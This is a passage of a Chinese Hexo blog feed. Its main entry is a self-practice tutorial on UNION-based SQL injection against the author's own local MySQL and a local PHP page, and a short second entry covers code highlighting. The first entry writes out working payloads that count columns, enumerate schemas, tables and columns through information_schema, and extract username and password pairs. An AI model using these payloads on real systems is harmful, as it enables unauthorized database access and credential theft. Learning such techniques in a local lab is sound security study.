(SELECT group_concat(schema_name) FROM information_schema.schemata), 3, 4, 5;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/1schema.png" alt></p><h4 id="2-确定表名"><a href="#2-确定表名" class="headerlink" title="2. 确定表名"></a>2. 确定表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (select group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;mynews&apos;), 3, 4, 5 limit 1,1;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/2mynew.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (select group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;test&apos;), 3, 4, 5 limit 1,1;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/3test.png" alt></p><p>对库进行一一查询，找到目标库</p><h4 id="3-列名"><a href="#3-列名" class="headerlink" title="3. 列名"></a>3. 列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos;), 3, 4, 5 limit 1,1;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/4contentCo.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos;), 3, 4, 5 limit 1,1;</span><br></pre></td></tr></table></figure><p>可以看到有重复的字段，原因是昨天练习数据库导入时，对同一<code>.sql</code>文件导入不同的库，即不同库里存着名为<code>users</code>和<code>content</code>的表。加上限定条件即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &apos;admin&apos; UNION SELECT 1,2,3,4,group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME=&apos;users&apos; AND TABLE_SCHEMA=&apos;test&apos;;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/5limit.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(username, passwd) FROM `test`.`content`), 3, 4,5;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/6content.png" alt></p><p>可以利用查到的库名表名字段名，查看对应的信息。</p><h3 id="三、网页上练习"><a href="#三、网页上练习" class="headerlink" title="三、网页上练习"></a>三、网页上练习</h3><h4 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h4><p>首先把<code>index.php</code>拷贝到工程文件中，用<code>phpstorm</code>打开文件，在<code>Terminal</code>输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 127.0.0.1:9000</span><br></pre></td></tr></table></figure><p>在浏览器中打开网页<code>http://127.0.0.1:9000/index.php</code></p><p>首页如下：</p><p><img src="/images/16page.png" alt></p><h4 id="2-前期工作"><a href="#2-前期工作" class="headerlink" title="2. 前期工作"></a>2. 前期工作</h4><p><code>index.php</code>显示程序如下：</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C17programm.png" alt></p><p>可知，显示的读取数据的前三个。</p><p>在提交按钮输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 49;</span><br></pre></td></tr></table></figure><p><img src="/images/7orderby.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 50;</span><br></pre></td></tr></table></figure><p><img src="/images/8error.png" alt></p><p>可知字段数为49。</p><h4 id="3-开始查询"><a href="#3-开始查询" class="headerlink" title="3. 开始查询"></a>3. 开始查询</h4><ul><li>查询库名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT version(), user(), (SELECT group_concat(schema_name) FROM information_schema.schemata),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/9schemaName.png" alt></p><ul><li>查询表名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;test&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/10testTableName.png" alt></p><ul><li>查询字段名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/11ContentColName.png" alt></p><p>可以看出来有重复的字段名，这是因为两个不同库里均有<code>content</code>和<code>users</code>表。加上库名的限制就正常了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos; AND table_schema=&apos;test&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/11ContentColName1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;user&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><ul><li>查询数据</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT concat_ws(&apos;~&apos;, author, title)  FROM `test`.`content` LIMIT 0,1),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/13readContent.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(author, &apos;~&apos;,title)  FROM`test`.`content`),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/14readContent.png" alt></p><p>同理也可查出<code>users</code>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(username, &apos;~&apos;, passwd)  FROM `test`.`users`),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/15readUse.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 先在数据库中使用&lt;code&gt;UNION&lt;/code&gt;写&lt;code&gt;SQL&lt;/code&gt;查出数据库版本，库，表，列等信息，再在&lt;code&gt;index.php&lt;/code&gt;中操作一遍。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>highlight</title>
    <link href="http://yoursite.com/2019/08/13/highlight/"/>
    <id>http://yoursite.com/2019/08/13/highlight/</id>
    <published>2019-08-13T00:48:23.000Z</published>
    <updated>2019-08-13T02:44:12.472Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 解决<code>markdown</code>代码上传到<code>github</code>上不高亮的问题。</p><a id="more"></a><!--export--><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock [lang:language] [title] [url] [link text] %&#125;</span><br><span class="line">code snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight js"><figcaption><span>Javascript Array Syntax</span><a href="http://j.mp/pPUUmW" target="_blank" rel="noopener">MDN Documentation</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="built_in">Array</span>(arrayLength);</span><br><span class="line"><span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="built_in">Array</span>(element0, element1, ..., elementN);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'foo'</span>;</span><br><span class="line"></span><br><span class="line">print(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">#python dictionary</span></span><br><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Zara'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name=<span class="string">'content'</span>;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars = <span class="keyword">array</span>(<span class="string">"Volvo"</span>, <span class="string">"BMW"</span>, <span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $cars[<span class="number">0</span>];<span class="comment">//输出"Volvo"</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $cars[<span class="number">1</span>];<span class="comment">//输出"BMW"</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $cars[<span class="number">2</span>];<span class="comment">//输出"Toyota"</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Zara'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 解决&lt;code&gt;markdown&lt;/code&gt;代码上传到&lt;code&gt;github&lt;/code&gt;上不高亮的问题。&lt;/p&gt;
    
    </summary>
    
      <category term="hexo" scheme="http://yoursite.com/categories/hexo/"/>
    
    
      <category term="issue" scheme="http://yoursite.com/tags/issue/"/>
    
  </entry>
  
</feed>
